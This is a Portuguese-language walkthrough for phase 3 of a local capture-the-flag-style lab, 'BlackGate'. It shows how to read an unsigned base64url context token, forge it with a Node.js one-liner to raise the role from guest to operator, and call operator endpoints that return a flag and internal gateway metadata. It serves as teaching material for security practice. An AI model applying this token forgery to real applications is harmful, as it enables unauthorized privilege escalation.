# Lab 05 - BlackGate - Walkthrough da Fase 3

Este walkthrough cobre a **Fase 3 — Weak Token / Role Escalation** do Lab 05. A aplicação ainda não implementa SSRF, file read, command injection, worker, upload ou admin final.

## Como subir

```bash
cd lab-05-blackgate
docker compose up --build
```

Acesse:

```text
http://localhost:8096
```

## Validação de saúde

Abra:

```text
http://localhost:8096/health
```

Resultado esperado:

```json
{
  "service": "blackgate",
  "status": "ok",
  "version": "1.2.0-phase3"
}
```

## Login

Abra `http://localhost:8096`. A aplicação deve redirecionar para `/login`.

Use uma conta comum:

```text
guest / guest123
```

Resultado esperado:

- login bem-sucedido;
- redirecionamento para `/dashboard`;
- topo com usuário, role e link de logout.

## Recon de Fase 2

Confirme os endpoints públicos:

```text
/robots.txt
/.well-known/security.txt
/api/status
/api/version
/api/client-config
/api/routes
/debug/ping
```

Com o header abaixo, `/debug/ping` revela metadados limitados de contexto:

```text
X-Debug-Token: guest-debug
```

Observe o bloco:

```json
{
  "context": {
    "header": "X-BG-Context",
    "verify": "/api/context/verify",
    "note": "Legacy context validation is enabled for compatibility checks."
  }
}
```

## Página Context

Abra:

```text
http://localhost:8096/context
```

Observe:

- role da sessão;
- issuer `legacy-context-service`;
- header `X-BG-Context`;
- link para `/api/context/me`;
- indicação de compatibility mode.

## Obter o token de contexto

Com a sessão de `guest`, abra:

```text
http://localhost:8096/api/context/me
```

Resposta esperada:

```json
{
  "user": "guest",
  "role": "guest",
  "scope": "limited",
  "context_token": "...",
  "hint": "Context tokens are consumed by legacy operator endpoints."
}
```

O token é um JSON em base64url sem assinatura. Essa é a falha didática da Fase 3.

## Decodificar e modificar o token

Payload original esperado:

```json
{
  "user": "guest",
  "role": "guest",
  "scope": "limited",
  "issued_by": "legacy-context-service"
}
```

Payload manipulado:

```json
{
  "user": "guest",
  "role": "operator",
  "scope": "operations",
  "issued_by": "legacy-context-service"
}
```

Gere o token manipulado com Node.js:

```bash
TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Validar o token

Envie o token para:

```text
POST /api/context/verify
Header: X-BG-Context: <TOKEN>
```

Resultado esperado:

```json
{
  "valid": true,
  "context": {
    "user": "guest",
    "role": "operator",
    "scope": "operations",
    "issued_by": "legacy-context-service"
  },
  "warning": "Legacy context tokens are not intended for direct client manipulation."
}
```

## Acessar briefing operator

Use:

```text
GET /api/operator/briefing
Header: X-BG-Context: <TOKEN>
```

Resultado esperado:

```json
{
  "classification": "operator-only",
  "briefing": "Legacy context validation accepted elevated operator scope.",
  "phase": "3",
  "finding": "weak unsigned context token",
  "flag": "FLAG{blackgate_weak_token_role_escalation_phase3}",
  "next_hint": "Operator context can see internal gateway metadata, but direct internal access is still blocked."
}
```

## Gateway metadata

Com o mesmo token, acesse:

```text
/api/operator/gateway-metadata
```

Resultado esperado:

```json
{
  "gateway": "gw-blackgate.local",
  "trusted_upstream": "api-core.internal",
  "internal_candidates": [
    "api-core.internal",
    "files-vault.internal",
    "legacy-panel.internal"
  ],
  "blocked_paths": [
    "/api/internal/files",
    "/legacy",
    "/debug/trace"
  ],
  "phase4_hint": "Some internal checks trust gateway-originated requests."
}
```

Isso prepara a Fase 4, mas ainda não implementa SSRF.

## Erros esperados

Sem sessão:

```json
{
  "error": "authentication_required",
  "message": "Login required to access this resource."
}
```

Sem token:

```json
{
  "error": "bad_request",
  "message": "Context token is required."
}
```

Com token `guest` não manipulado:

```json
{
  "error": "forbidden",
  "message": "Valid operator context required."
}
```

## O que deve ficar para fases futuras

A Fase 3 não implementa SSRF funcional, JWT explorável de admin, command injection, upload, path traversal, fila real, banco externo, flag final ou exploração de admin.

Ela prepara o terreno para **Fase 4 — Gateway Trust / SSRF Setup**.
